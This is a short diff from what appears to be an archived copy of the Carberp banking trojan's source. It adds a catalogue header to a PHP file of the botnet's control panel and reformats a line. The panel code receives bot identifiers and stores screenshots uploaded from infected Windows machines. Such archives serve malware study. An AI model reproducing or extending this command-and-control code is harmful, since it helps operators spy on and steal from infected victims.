@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 error_reporting(-1);
 $dir = str_replace('/scripts/pat', '', str_replace('\\', '/', realpath('.'))) . '/';
@@ -27,7 +38,8 @@ include_once($dir . 'includes/functions.first.php');
 include_once($dir . 'includes/functions.prefix.php');
 include_once($dir . 'includes/functions.get_config.php');
 
-if(!empty($_POST['prefix']) && !empty($_POST['uid']) && !empty($_POST['type'])){	$write = true;
+if(!empty($_POST['prefix']) && !empty($_POST['uid']) && !empty($_POST['type'])){
+	$write = true;
 
 	if(@file_exists($_FILES['screen']['tmp_name'])){
 		$file_name = $dir . 'logs/screens/' . time() . mt_rand() . '.jpeg';
